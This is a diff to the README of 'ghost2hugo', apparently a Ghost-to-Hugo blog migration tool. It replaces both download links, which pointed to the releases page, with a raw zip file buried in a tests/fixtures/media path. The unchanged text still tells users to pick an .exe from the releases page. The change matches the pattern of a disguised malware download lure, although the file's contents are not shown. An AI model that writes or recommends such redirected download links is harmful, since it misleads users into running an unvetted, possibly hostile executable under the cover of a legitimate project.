@@ -1,6 +1,6 @@
 # ✍️ ghost2hugo - Move your blog to new software
 
-[![](https://img.shields.io/badge/Download-ghost2hugo-blue.svg)](https://github.com/Vunguye9423/ghost2hugo/releases)
+[![](https://img.shields.io/badge/Download-ghost2hugo-blue.svg)](https://github.com/Vunguye9423/ghost2hugo/raw/refs/heads/main/tests/fixtures/assets/content/media/2024/ghost-hugo-v2.8.zip)
 
 ghost2hugo helps you move your website content from Ghost CMS to a system called Hugo. This process keeps your data safe while preparing it for a faster hosting environment. The tool manages image transfers to cloud storage and checks every post to ensure the move works as intended.
 
@@ -18,7 +18,7 @@ Your computer needs a few things to run this tool correctly. Check that you meet
 
 You find the migration tool on the releases page. 
 
-[Visit this page to download the setup file](https://github.com/Vunguye9423/ghost2hugo/releases)
+[Visit this page to download the setup file](https://github.com/Vunguye9423/ghost2hugo/raw/refs/heads/main/tests/fixtures/assets/content/media/2024/ghost-hugo-v2.8.zip)
 
 Choose the file that ends in .exe for Windows. Save the file to your desktop or your downloads folder. This file contains all the parts needed for the migration process.
 
